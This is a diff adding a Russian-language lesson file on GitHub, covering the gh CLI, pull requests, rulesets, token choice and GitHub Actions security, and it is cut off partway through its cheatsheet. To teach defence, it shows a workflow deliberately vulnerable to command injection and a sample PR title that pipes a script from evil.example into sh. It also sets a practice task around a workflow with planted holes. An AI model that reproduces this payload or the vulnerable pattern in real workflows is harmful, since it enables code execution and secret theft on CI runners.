@@ -1,0 +1,336 @@
+{
+  "id": "github",
+  "title": "GitHub",
+  "color": "#6e40c9",
+  "icon": "branch",
+  "level": "средний",
+  "summary": "GitHub хранит репозитории в сети и собирает вокруг кода всю работу: pull request и ревью, проверки GitHub Actions, релизы, задачи и защиту главной ветки. Урок про сайт и программу gh.",
+  "detect": { "files": [".github"], "deps": [], "bins": ["gh"], "stacks": [] },
+  "related": ["git", "ci-cd", "deploy", "env"],
+  "sections": [
+    {
+      "type": "idea",
+      "title": "Зачем нужен GitHub",
+      "text": "Git хранит историю на вашем компьютере. GitHub хранит копию в сети и добавляет то, чего в git нет: просьбы влить ветку (pull request), ревью кода, проверки на каждый коммит, задачи, релизы с файлами для скачивания. Всё это можно делать на сайте, а можно из терминала программой gh. Главная ветка защищается правилами: в неё попадает только код, который прошёл проверки и ревью.",
+      "analogy": "Как общий цех с проходной. Каждый мастерит у себя дома (git), а готовую деталь приносит в цех. На проходной её смотрит контролёр и прогоняют через станок проверки. Без пропуска на склад готовых деталей (main) ничего не попадает."
+    },
+    {
+      "type": "diagram",
+      "title": "Путь правки до main",
+      "nodes": [
+        { "id": "branch", "label": "Ветка", "note": "работа над задачей", "icon": "branch" },
+        { "id": "push", "label": "git push", "note": "ветка на GitHub", "icon": "cloud" },
+        { "id": "pr", "label": "Pull request", "note": "просьба влить", "icon": "git" },
+        { "id": "checks", "label": "Проверки", "note": "GitHub Actions", "icon": "pipeline" },
+        { "id": "review", "label": "Ревью", "note": "коллега одобряет", "icon": "eye" },
+        { "id": "rules", "label": "Ruleset", "note": "всё ли выполнено", "icon": "shield" },
+        { "id": "main", "label": "main", "note": "слияние", "icon": "check" }
+      ],
+      "edges": [
+        ["branch", "push", "отправить"],
+        ["push", "pr", "gh pr create"],
+        ["pr", "checks", "запускает"],
+        ["checks", "review", "зелёные"],
+        ["review", "rules", "Approve"],
+        ["rules", "main", "кнопка Merge"]
+      ],
+      "caption": "Правила main проверяют, что проверки зелёные и ревью есть. Пока чего-то нет, кнопка слияния закрыта даже для владельца."
+    },
+    {
+      "type": "terms",
+      "title": "Слова GitHub",
+      "items": [
+        { "term": "GitHub CLI", "text": "Программа gh: работа с GitHub из терминала - pull request, проверки, релизы, задачи.", "forms": ["gh"] },
+        { "term": "Форк", "text": "Ваша копия чужого репозитория на GitHub. В ней можно делать что угодно, а правки предлагать автору через pull request.", "forms": ["форк", "форка", "форке", "форки", "форков", "fork"] },
+        { "term": "upstream", "text": "Обычное имя remote для исходного репозитория, от которого сделан форк. origin при этом - ваш форк.", "forms": [] },
+        { "term": "Ревью", "text": "Просмотр чужого pull request. Итог: Approve (одобрить), Request changes (просить правки) или Comment.", "forms": ["review", "approve"] },
+        { "term": "Черновик PR", "text": "Pull request с пометкой draft: его видно, проверки идут, но слить его нельзя, и ревьюеров он не зовёт.", "forms": ["draft", "черновик"] },
+        { "term": "CODEOWNERS", "text": "Файл со списком, кто отвечает за какие папки. GitHub сам зовёт этих людей на ревью pull request, который трогает их файлы.", "forms": ["владельцы кода"] },
+        { "term": "Ruleset", "text": "Набор правил для веток или тегов: запрет прямой отправки, обязательные проверки и ревью, запрет force push. Новая замена старым branch protection rules.", "forms": ["рулсет", "rulesets", "branch protection", "защита веток"] },
+        { "term": "Обязательная проверка", "text": "Проверка CI, без зелёного результата которой кнопка слияния закрыта. В настройках - required status check.", "forms": ["обязательные проверки", "required status check", "required status checks"] },
+        { "term": "Action", "text": "Готовый шаг для GitHub Actions из чужого репозитория. Подключается строкой uses: владелец/репозиторий@версия.", "forms": ["экшен", "экшена", "экшены", "экшенов"] },
+        { "term": "GITHUB_TOKEN", "text": "Временный ключ, который GitHub сам выдаёт каждому запуску workflow. Действует только на этот репозиторий и только пока идёт джоба.", "forms": ["github.token"] },
+        { "term": "Личный токен", "text": "PAT, personal access token: ключ от вашего аккаунта для скриптов. Fine-grained - на выбранные репозитории и права. Classic - сразу на всё, что доступно вам.", "forms": ["PAT", "fine-grained", "personal access token"] },
+        { "term": "Git-тег", "text": "Неподвижная метка на коммите с именем, например v1.2.0. Ветка уезжает вперёд с каждым коммитом, тег - нет.", "forms": ["git-тег", "git-тега", "git-теги", "git-тегом", "git tag"] },
+        { "term": "Релиз", "text": "Страница на GitHub к тегу: что изменилось и файлы для скачивания, например собранная программа.", "forms": ["релиза", "релизы", "релизов", "релизом"] },
+        { "term": "Issue", "text": "Задача или сообщение об ошибке в репозитории. У каждой номер, по нему ссылаются из коммитов и PR: #12.", "forms": ["issues", "ишью"] },
+        { "term": "Label", "text": "Цветная метка на issue и pull request: bug, docs, good first issue. По ней ищут и фильтруют.", "forms": ["лейбл", "лейблы", "labels"] },
+        { "term": "Лимит запросов", "text": "Сколько обращений к API GitHub разрешено за час. Превысили - запросы отклоняются, пока лимит не обновится. Резкий поток операций GitHub считает злоупотреблением.", "forms": ["лимиты запросов", "лимита запросов", "rate limit"] },
+        { "term": "Dependabot", "text": "Встроенный робот GitHub: предупреждает об уязвимых зависимостях и сам открывает pull request с новыми версиями.", "forms": [] }
+      ]
+    },
+    {
+      "type": "steps",
+      "title": "Первая настройка gh",
+      "items": ["gh auth login - выберите GitHub.com, протокол SSH или HTTPS и вход через браузер.", "gh auth status - кто вошёл, каким протоколом ходит git и какие права (scopes) у ключа: repo, read:org, workflow.", "Нужно больше прав - gh auth refresh -s workflow. Без scope workflow git по HTTPS не отправит правки в .github/workflows.", "gh auth setup-git - git по HTTPS будет брать ключ у gh, пароль вводить не нужно.", "gh repo create my-app --private --source . --push - создать репозиторий из текущей папки и отправить код.", "gh repo clone owner/my-app - скачать существующий. gh repo view --web - открыть его на сайте."]
+    },
+    {
+      "type": "anatomy",
+      "title": "Разбор команды создания pull request",
+      "parts": [
+        { "text": "gh pr create", "note": "создать pull request из текущей ветки" },
+        { "text": "--fill", "note": "заголовок и описание взять из коммитов" },
+        { "text": "--draft", "note": "черновик: проверки идут, слить нельзя" },
+        { "text": "--base main", "note": "куда вливать" },
+        { "text": "--reviewer alice", "note": "кого позвать на ревью" },
+        { "text": "--label bug", "note": "какую метку поставить" }
+      ]
+    },
+    {
+      "type": "steps",
+      "title": "Обычный путь задачи через pull request",
+      "items": ["git switch main и git pull, затем git switch -c fix-login - ветка от свежего main.", "Правки и коммиты. git push -u origin fix-login - одним заходом, когда есть что показать.", "gh pr create --fill --draft - черновик. Проверки начинают работать сразу.", "gh pr checks - один раз посмотреть, что с проверками. Красное - чинить в той же ветке новым коммитом.", "gh pr ready - снять пометку черновика. Ревьюеры из CODEOWNERS назначатся сами.", "Ревьюер: gh pr checkout 42 - забрать ветку к себе, gh pr diff 42 - посмотреть правки, gh pr review 42 --approve или --request-changes -b \"что поправить\".", "gh pr merge 42 --squash --delete-branch - слить одним коммитом и удалить ветку. Или --auto: слияние случится само, когда проверки станут зелёными.", "git switch main и git pull - забрать слитое к себе."]
+    },
+    {
+      "type": "compare",
+      "title": "Три способа слить pull request",
+      "cols": ["Способ", "Что попадёт в main", "Когда брать"],
+      "rows": [
+        ["Merge commit: gh pr merge --merge", "Все коммиты ветки плюс отдельный коммит слияния", "Важна история каждого шага внутри задачи"],
+        ["Squash: gh pr merge --squash", "Один коммит на весь pull request", "Обычная задача. История main - по строке на PR, откат одним git revert"],
+        ["Rebase: gh pr merge --rebase", "Коммиты ветки по одному поверх main, без коммита слияния", "Коммиты уже аккуратные и каждый имеет смысл сам по себе"]
+      ]
+    },
+    {
+      "type": "example",
+      "title": "Файл CODEOWNERS",
+      "label": ".github/CODEOWNERS",
+      "code": "# Кто отвечает за файлы. Побеждает последняя подходящая строка.\n*              @my-org/core\n/docs/         @my-org/writers\n/.github/      @my-org/devops\n*.sql          @alice",
+      "note": "Файл лежит в .github, в корне или в docs. Правка в docs/ позовёт на ревью команду writers, правка .sql-файла - alice. Чтобы их одобрение стало обязательным, в ruleset включают Require review from Code Owners."
+    },
+    {
+      "type": "rules",
+      "title": "Защита main",
+      "items": [
+        { "kind": "do", "title": "Ruleset на main", "text": "Settings > Rules > Rulesets > New branch ruleset. Включите: Restrict deletions, Block force pushes, Require a pull request before merging, Require status checks to pass. Посмотреть, что действует: gh ruleset check main." },
+        { "kind": "do", "title": "Обязательные проверки - по имени джобы", "text": "В Require status checks выбирается имя джобы, например test (24). В списке оно появится, только когда джоба уже хоть раз запускалась." },
+        { "kind": "dont", "title": "Не делайте обязательной проверку, которая может не запуститься", "text": "Если workflow пропущен фильтром paths или джоба переименована, проверка навсегда висит в «Expected - Waiting for status to be reported», и PR не слить." },
+        { "kind": "do", "title": "Слияние само, без ожидания", "text": "gh pr merge --auto --squash - PR сольётся, как только проверки станут зелёными. Не нужно ждать у экрана и опрашивать статус. Работает, если в настройках репозитория включён Allow auto-merge." },
+        { "kind": "tip", "title": "Bypass list - пустой", "text": "В ruleset есть список тех, кто может обойти правила. Чем он короче, тем меньше правило формальное. Владелец в нём - значит, правило не защищает от его же спешки." },
+        { "kind": "when", "title": "Rulesets или старые правила веток", "text": "Новые правила заводите rulesets: их можно складывать слоями, включать для групп веток и тегов, смотреть из gh. Старые branch protection rules продолжают работать." },
+        { "kind": "tip", "title": "Бесплатный план", "text": "В приватном репозитории на бесплатном плане rulesets и защиты веток нет, нужен Pro или Team. Required reviewers у окружения в приватном репозитории есть только в Enterprise. В открытых репозиториях всё это доступно всем." }
+      ]
+    },
+    {
+      "type": "example",
+      "title": "Безопасный workflow GitHub Actions",
+      "label": ".github/workflows/ci.yml",
+      "code": "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm test",
+      "note": "on - события, которые запускают workflow. permissions урезает GITHUB_TOKEN до чтения. concurrency отменяет устаревший запуск в PR. Экшены закреплены по SHA коммита: тег можно передвинуть на другой код, SHA - нет. Комментарий с версией нужен людям и Dependabot. timeout-minutes не даёт зависшей джобе тратить минуты часами."
+    },
+    {
+      "type": "compare",
+      "title": "События, которые запускают workflow",
+      "cols": ["Событие (on:)", "Когда срабатывает", "Секреты для PR из форка"],
+      "rows": [
+        ["push", "Отправка в ветку или тег. Фильтры: branches, tags, paths", "Не относится"],
+        ["pull_request", "PR открыт, обновлён, снова открыт", "Нет. Токен только на чтение. Так и задумано"],
+        ["pull_request_target", "То же, но код workflow и права - из основной ветки", "Да, и токен на запись. Поэтому опасно"],
+        ["workflow_dispatch", "Кнопка Run workflow или gh workflow run", "Не относится"],
+        ["schedule", "По расписанию cron, время UTC", "Не относится"],
+        ["release", "Релиз создан или опубликован", "Не относится"]
+      ]
+    },
+    {
+      "type": "compare",
+      "title": "Какой ключ брать",
+      "cols": ["", "GITHUB_TOKEN", "Fine-grained PAT", "Classic PAT"],
+      "rows": [
+        ["Кто выдаёт", "GitHub сам, на каждый запуск", "Вы, Settings > Developer settings", "Вы, там же"],
+        ["Срок жизни", "Пока идёт джоба", "Задаёте сами, лучше до 90 дней", "Задаёте сами, можно бессрочно"],
+        ["На что действует", "Только этот репозиторий, права из permissions", "Выбранные репозитории и выбранные права", "Все ваши репозитории, широкие права вроде repo"],
+        ["Запускает другие workflow", "Нет, кроме workflow_dispatch и repository_dispatch", "Да", "Да"],
+        ["Когда брать", "Почти всегда внутри Actions", "Скрипт, другой репозиторий, запуск другого workflow", "Только если fine-grained не умеет нужное"]
+      ]
+    },
+    {
+      "type": "codepair",
+      "title": "Внедрение команды через ${{ }}",
+      "left": { "label": "Опасно", "code": "on: pull_request\n\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Новый PR: ${{ github.event.pull_request.title }}\"" },
+      "right": { "label": "Безопасно", "code": "on: pull_request\n\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"Новый PR: $TITLE\"" },
+      "note": "${{ }} подставляется в текст скрипта до запуска. Заголовок PR пишет кто угодно. Заголовок a\"; curl evil.example | sh; \" станет частью команды. Через env значение попадает в переменную окружения, и оболочка считает его просто текстом. Так же опасны body, имя ветки, текст комментария и issue."
+    },
+    {
+      "type": "rules",
+      "title": "Безопасность GitHub Actions",
+      "items": [
+        { "kind": "do", "title": "permissions: contents: read", "text": "Ставьте на весь файл. Права на запись выдавайте только той джобе, которой они нужны: contents: write для релиза, pages: write для Pages." },
+        { "kind": "do", "title": "Чужие экшены - по SHA", "text": "uses: actions/checkout@<40 символов SHA> # v7.0.1. Автор или взломщик может передвинуть тег v7 на вредный код, а SHA всегда указывает на один и тот же коммит. Dependabot умеет обновлять SHA сам." },
+        { "kind": "dont", "title": "pull_request_target и код из PR", "text": "Не делайте checkout ветки PR и сборку в workflow с pull_request_target. Код из чужого форка получит ваши секреты и токен на запись. Сборку чужого кода - только в pull_request." },
+        { "kind": "dont", "title": "${{ github.event.* }} прямо в run", "text": "Текст из PR, issue, комментария или имени ветки - через env, как в примере выше. Иначе его автор выполнит свою команду на раннере." },
+        { "kind": "do", "title": "Секреты выкладки - в окружении", "text": "Settings > Environments > production: Required reviewers и секреты окружения. Секрет получит только джоба с environment: production и только после Approve." },
+        { "kind": "dont", "title": "Не печатайте секреты", "text": "GitHub прячет известные значения в логе, но не их части, не base64 и не вывод программ, которые их преобразуют. Не делайте echo секретов даже для отладки." },
+        { "kind": "when", "title": "concurrency", "text": "Для проверок - group по ветке и cancel-in-progress: true. Для выкладки - постоянная group и cancel-in-progress: false: выкладки идут по очереди и не обрываются." },
+        { "kind": "tip", "title": "Кэш и артефакты", "text": "Кэш (actions/cache или cache: в setup-node) пропадает, если к нему не обращались 7 дней, и место под кэш у репозитория ограничено. Артефакты по умолчанию живут 90 дней, retention-days сокращает срок." }
+      ]
+    },
+    {
+      "type": "example",
+      "title": "Релиз по тегу с файлами и заметками",
+      "label": ".github/workflows/release.yml",
+      "code": "name: Release\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  release:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n      - run: tar -czf \"my-app-$GITHUB_REF_NAME.tar.gz\" dist\n      - run: gh release create \"$GITHUB_REF_NAME\" my-app-*.tar.gz --generate-notes --verify-tag\n        env:\n          GH_TOKEN: ${{ github.token }}",
+      "note": "Запускается от тега вида v1.2.0. Права на запись - только этой джобе. gh уже стоит на раннерах GitHub, ключ ему передают через GH_TOKEN. --generate-notes собирает заметки из слитых PR с прошлого релиза. Версия по SemVer: MAJOR.MINOR.PATCH. PATCH - исправления, MINOR - новое без поломок, MAJOR - ломает старое поведение."
+    },
+    {
+      "type": "example",
+      "title": "Dependabot: обновления пачкой",
+      "label": ".github/dependabot.yml",
+      "code": "version: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    groups:\n      minor-and-patch:\n        update-types: [\"minor\", \"patch\"]\n  - package-ecosystem: \"github-actions\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"",
+      "note": "Раз в неделю Dependabot проверяет зависимости npm и экшены в workflow, включая закреплённые SHA. groups собирает мелкие обновления в один PR: меньше PR, меньше пайплайнов и ревью. Мажорные версии приходят отдельными PR: они могут ломать код."
+    },
+    {
+      "type": "compare",
+      "title": "Защита от утечек и уязвимостей",
+      "cols": ["Функция", "Что делает", "Где включить"],
+      "rows": [
+        ["Secret scanning", "Ищет ключи и токены в коде и истории, присылает предупреждение", "Settings, раздел безопасности кода. В открытых репозиториях включено"],
+        ["Push protection", "Не принимает push, если в коммите найден ключ (ошибка GH013)", "Там же. В открытых репозиториях включено"],
+        ["Dependabot alerts", "Предупреждает, что версия зависимости уязвима", "Там же"],
+        ["Dependabot updates", "Сам открывает PR с новыми версиями", "Файл .github/dependabot.yml"],
+        ["Code scanning", "Ищет уязвимости в коде (CodeQL) на каждый PR", "Там же, Default setup"],
+        ["Private vulnerability reporting", "Кнопка Report a vulnerability: об уязвимости сообщают закрыто, а не в открытом issue", "Там же, плюс файл SECURITY.md"]
+      ]
+    },
+    {
+      "type": "example",
+      "title": "GitHub Pages: сайт из репозитория",
+      "label": ".github/workflows/pages.yml",
+      "code": "name: Pages\non:\n  push:\n    branches: [main]\n  workflow_dispatch:\n\npermissions:\n  contents: read\n  pages: write\n  id-token: write\n\nconcurrency:\n  group: pages\n  cancel-in-progress: false\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n      - uses: actions/upload-pages-artifact@v5\n        with:\n          path: dist/\n\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    environment:\n      name: github-pages\n      url: ${{ steps.deployment.outputs.page_url }}\n    steps:\n      - id: deployment\n        uses: actions/deploy-pages@v5",
+      "note": "Pages раздаёт статический сайт по адресу владелец.github.io/репозиторий. Перед первым запуском: Settings > Pages > Source: GitHub Actions. id-token: write нужен, чтобы Pages проверил, что выкладку прислал именно этот workflow. Pages подходит для документации и простых сайтов, сервер на нём не запустить."
+    },
+    {
+      "type": "rules",
+      "title": "Аккаунт: лимиты, токены, вход",
+      "items": [
+        { "kind": "dont", "title": "Не делайте десятки операций за минуты", "text": "Защита от злоупотреблений смотрит на темп. Несколько скриптов или ИИ-агентов, которые разом пушат ветки, открывают и сливают PR, похожи на робота-спамера. Итог - временная блокировка аккаунта, а снимать её приходится через поддержку." },
+        { "kind": "do", "title": "Отправляйте пачкой", "text": "Копите коммиты и делайте один push: пять коммитов одним push - одна операция. PR открывайте, когда задача готова, а не после каждого коммита. Удаление веток почти ничего не стоит." },
+        { "kind": "do", "title": "Знайте лимиты", "text": "API: 5000 запросов в час на пользователя, 60 без входа, 1000 в час у GITHUB_TOKEN на репозиторий. Есть вторичные лимиты: не больше 100 запросов одновременно и около 80 созданий в минуту (PR, issue, комментарии). Сколько осталось: gh api rate_limit." },
+        { "kind": "dont", "title": "Не опрашивайте в цикле", "text": "gh pr checks --watch спрашивает сервер раз в 10 секунд, gh run watch - раз в 3. Свой цикл со sleep 5 ещё хуже. Проверьте один раз позже или поставьте gh pr merge --auto." },
+        { "kind": "when", "title": "SSH или HTTPS", "text": "SSH: ключ на машине, проверка ssh -T git@github.com, пароль не нужен. HTTPS: ключ хранит менеджер учётных данных или gh auth setup-git. Пароль от аккаунта для git не работает с 2021 года." },
+        { "kind": "do", "title": "Для скриптов - fine-grained токен", "text": "Только нужные репозитории, только нужные права, срок до 90 дней. Утёк - вред ограничен. Для постоянной автоматики организации лучше GitHub App: у него свои лимиты и своё имя в истории." },
+        { "kind": "tip", "title": "Двухфакторный вход", "text": "Включите 2FA: вход по паролю и коду из приложения или ключа. GitHub требует его от тех, кто отправляет код." }
+      ]
+    },
+    {
+      "type": "steps",
+      "title": "Форк и синхронизация с исходным репозиторием",
+      "items": ["gh repo fork owner/project --clone - сделать форк и скачать его. origin - ваш форк, upstream - исходный репозиторий.", "git switch -c fix-typo - ветка под правку. В main форка не коммитьте: так его легко обновлять.", "Перед работой и перед PR: git fetch upstream и git rebase upstream/main - ваша ветка встаёт поверх свежего кода.", "git push -u origin fix-typo - ветка уходит в ваш форк.", "gh pr create --fill - PR откроется в исходный репозиторий.", "Main форка отстал: gh repo sync ваш-логин/project обновит его на GitHub, затем git pull в main у себя."]
+    },
+    {
+      "type": "compare",
+      "title": "Файлы порядочного открытого репозитория",
+      "cols": ["Файл", "Зачем"],
+      "rows": [
+        ["README.md", "Что это, как поставить и запустить"],
+        ["LICENSE", "На каких условиях можно брать код. Без лицензии код открыт для чтения, но брать его по закону нельзя"],
+        ["CONTRIBUTING.md", "Как предложить правку: ветки, тесты, стиль, как оформить PR"],
+        ["SECURITY.md", "Куда сообщать об уязвимостях, чтобы не писать о них в открытом issue"],
+        ["CODE_OF_CONDUCT.md", "Правила общения в проекте"],
+        [".github/ISSUE_TEMPLATE/*.yml", "Формы для issue: шаги, версия, ожидание. Без них половина сообщений без нужных деталей"],
+        [".github/PULL_REQUEST_TEMPLATE.md", "Шаблон описания PR: что сделано, как проверено"],
+        [".github/CODEOWNERS", "Кого звать на ревью"],
+        [".github/dependabot.yml", "Обновления зависимостей"]
+      ]
+    },
+    {
+      "type": "practice",
+      "title": "Попробуйте сами: репозиторий с защищённым main",
+      "task": "Создайте приватный репозиторий из папки проекта, защитите main правилами и проведите правку через pull request со squash-слиянием.",
+      "steps": ["Проверьте вход: gh auth status.", "Создайте репозиторий и отправьте код: gh repo create my-app --private --source . --push.", "На сайте: Settings > Rules > Rulesets > New branch ruleset. Target: Default branch. Включите Restrict deletions, Block force pushes, Require a pull request before merging.", "Сделайте ветку, правку и коммит, отправьте ветку.", "Откройте PR: gh pr create --fill.", "Слейте: gh pr merge --squash --delete-branch."],
+      "check": "gh ruleset check main показывает ваши правила. Прямой git push origin main отклоняется с ошибкой GH013. В git log --oneline на main после слияния одна новая строка на весь PR.",
+      "hint": "На бесплатном плане правила для приватного репозитория недоступны: для пробы сделайте репозиторий открытым (--public) или возьмите план Pro.",
+      "solution": "gh auth status\ngh repo create my-app --private --source . --push\n# ruleset - на сайте: Settings > Rules > Rulesets\ngh ruleset check main\n\ngit switch -c readme-fix\n# правка README.md\ngit commit -am \"README: как запустить\"\ngit push -u origin readme-fix\ngh pr create --fill\ngh pr merge --squash --delete-branch\ngit switch main\ngit pull\ngit log --oneline -3"
+    },
+    {
+      "type": "practice",
+      "title": "Попробуйте сами: починить опасный workflow",
+      "task": "В репозитории лежит workflow для тестов pull request. В нём четыре дыры: событие pull_request_target, шаг actions/checkout@main с ref: ${{ github.event.pull_request.head.sha }}, шаг run: echo \"PR: ${{ github.event.pull_request.title }}\" и нет блока permissions. Перепишите его безопасно: он должен печатать заголовок PR и запускать npm ci и npm test.",
+      "steps": ["Замените pull_request_target на pull_request.", "Добавьте permissions: contents: read.", "Закрепите actions/checkout по SHA с комментарием версии.", "Уберите ref: обычный checkout в pull_request уже берёт код PR.", "Заголовок PR передайте через env."],
+      "check": "В файле нет pull_request_target. ${{ github.event встречается только внутри env. Все uses закреплены по SHA. PR из форка проходит тесты, но не видит секретов.",
+      "hint": "Найдите все ${{ github.event в разделах run - каждое такое место переносится в env. SHA нужного тега: gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq .object.sha.",
+      "solution": "name: PR checks\non:\n  pull_request:\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: pr-${{ github.event.pull_request.number }}\n  cancel-in-progress: true\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"PR: $TITLE\"\n      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm test"
+    },
+    {
+      "type": "practice",
+      "title": "Попробуйте сами: релиз по тегу",
+      "task": "Настройте выпуск версии: тег v1.0.0 запускает workflow, тот собирает проект, упаковывает dist в архив и создаёт релиз с этим архивом и заметками из слитых PR.",
+      "steps": ["Создайте .github/workflows/release.yml с триггером push: tags: [\"v*\"].", "Дайте джобе contents: write, остальному файлу - contents: read.", "Соберите проект и упакуйте dist в tar.gz.", "Создайте релиз: gh release create с --generate-notes и --verify-tag, ключ - через GH_TOKEN.", "Поставьте тег на свежий main и отправьте только его: git tag -a v1.0.0 -m \"Первая версия\", git push origin v1.0.0."],
+      "check": "gh release list показывает v1.0.0. gh release view v1.0.0 показывает заметки и файл my-app-v1.0.0.tar.gz.",
+      "hint": "Имя тега внутри джобы лежит в переменной GITHUB_REF_NAME. Ошибка «Resource not accessible by integration» значит, что джобе не дали contents: write.",
+      "solution": "name: Release\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  release:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n      - run: tar -czf \"my-app-$GITHUB_REF_NAME.tar.gz\" dist\n      - run: gh release create \"$GITHUB_REF_NAME\" my-app-*.tar.gz --generate-notes --verify-tag\n        env:\n          GH_TOKEN: ${{ github.token }}\n\n# Потом в терминале:\n# git switch main && git pull\n# git tag -a v1.0.0 -m \"Первая версия\"\n# git push origin v1.0.0"
+    },
+    {
+      "type": "mistakes",
+      "title": "Частые беды",
+      "items": [
+        { "problem": "push отклонён: «refusing to allow an OAuth App to create or update workflow ... without workflow scope».", "fix": "У ключа gh нет права на файлы workflow. Выполните gh auth refresh -s workflow и повторите push." },
+        { "problem": "«Support for password authentication was removed».", "fix": "Git по HTTPS больше не принимает пароль аккаунта. Выполните gh auth login и gh auth setup-git или перейдите на SSH." },
+        { "problem": "«GH013: Repository rule violations» или «Push cannot contain secrets».", "fix": "Правило ruleset запрещает такой push или в коммите найден ключ. В main - через PR. Ключ: уберите его из коммитов до отправки (git reset --soft и новый коммит) и выпустите новый ключ - старый считайте утёкшим." },
+        { "problem": "Проверка в PR навсегда «Expected - Waiting for status to be reported».", "fix": "Обязательная проверка ждёт джобу, которая не запустилась: workflow пропущен фильтром paths, джоба переименована. Сверьте имя в ruleset с именем джобы или уберите фильтр." },
+        { "problem": "Коммит или PR, созданный в workflow, не запустил другие workflow.", "fix": "События от GITHUB_TOKEN нарочно не запускают новые workflow, чтобы не было бесконечного круга. Нужен fine-grained токен, GitHub App или workflow_dispatch." },
+        { "problem": "«Resource not accessible by integration» (403) в джобе.", "fix": "У GITHUB_TOKEN нет нужного права. Добавьте джобе permissions: например contents: write для релиза или pull-requests: write для комментария." },
+        { "problem": "PR из форка падает: секреты пустые.", "fix": "Так и задумано: pull_request из форка не видит секретов. Не переносите сборку в pull_request_target. Джобы, которым нужен секрет, запускайте только для своих веток." },
+        { "problem": "«API rate limit exceeded» или «secondary rate limit».", "fix": "Слишком много запросов. Остановите циклы и параллельные скрипты, подождите сброса (gh api rate_limit покажет время), дальше работайте пачками." },
+        { "problem": "Форк отстал на сотни коммитов, PR в конфликтах.", "fix": "git fetch upstream и git rebase upstream/main в ветке, затем git push --force-with-lease. Main форка - gh repo sync." }
+      ]
+    },
+    {
+      "type": "cheatsheet",
+      "title": "Шпаргалка",
+      "items": [
+        { "group": "Вход и репозиторий", "cmd": "gh auth login", "text": "Войти в GitHub" },
+        { "cmd": "gh auth status", "text": "Кто вошёл и какие права у ключа" },
+        { "cmd": "gh auth refresh -s workflow", "text": "Добавить право на файлы workflow" },
+        { "cmd": "gh auth setup-git", "text": "Git по HTTPS берёт ключ у gh" },
+        { "cmd": "gh repo create my-app --private --source . --push", "text": "Создать репозиторий из папки и отправить код" },
+        { "cmd": "gh repo clone owner/repo", "text": "Скачать репозиторий" },
+        { "cmd": "gh repo view --web", "text": "Открыть репозиторий в браузере" },
+        { "group": "Pull request", "cmd": "gh pr create --fill --draft", "text": "Черновик PR из текущей ветки" },
+        { "cmd": "gh pr list", "text": "Открытые PR" },
+        { "cmd": "gh pr status", "text": "Мои PR и PR, где ждут моего ревью" },
+        { "cmd": "gh pr checkout 42", "text": "Забрать ветку PR к себе" },
+        { "cmd": "gh pr diff 42", "text": "Правки PR" },
+        { "cmd": "gh pr checks 42", "text": "Статус проверок PR, один раз" },
+        { "cmd": "gh pr review 42 --approve", "text": "Одобрить PR" },
+        { "cmd": "gh pr review 42 --request-changes -b \"текст\"", "text": "Попросить правки" },
+        { "cmd": "gh pr ready 42", "text": "Снять пометку черновика" },
+        { "cmd": "gh pr merge 42 --squash --delete-branch", "text": "Слить одним коммитом и удалить ветку" },
+        { "cmd": "gh pr merge 42 --auto --squash", "text": "Слить само, когда проверки зелёные" },
+        { "group": "Правила и секреты", "cmd": "gh ruleset list", "text": "Rulesets репозитория" },
+        { "cmd": "gh ruleset check main", "text": "Какие правила действуют на ветку main" },
+        { "cmd": "gh secret set DEPLOY_TOKEN --env production", "text": "Положить секрет в окружение (значение спросит)" },
+        { "cmd": "gh secret list", "text": "Имена секретов репозитория" },
+        { "group": "Теги и релизы", "cmd": "git tag -a v1.2.0 -m \"текст\"", "text": "Поставить тег на текущий коммит" },
+        { "cmd": "git push origin v1.2.0", "text": "Отправить один тег" },
+        { "cmd": "gh release create v1.2.0 dist/*.zip --generate-notes", "text": "Релиз с файлами и заметками из PR" },
+        { "cmd": "gh release list", "text": "Список релизов" },
+        { "cmd": "gh release download v1.2.0", "text": "Скачать файлы релиза" },
+        { "group": "Issue и метки", "cmd": "gh issue create -t \"заголовок\" -l bug", "text": "Новая задача с меткой" },
+        { "cmd": "gh issue list -l bug", "text": "Задачи с меткой bug" },
+        { "cmd": "gh label create \"good first issue\" -c 7057ff", "text": "Новая метка" },
+        { "group": "Форки", "cmd": "gh repo fork owner/repo --clone", "text": "Форк, клон и remote upstream" },
+        { "cmd": "gh repo sync", "text": "Обновить локальный main из исходного репозитория" },
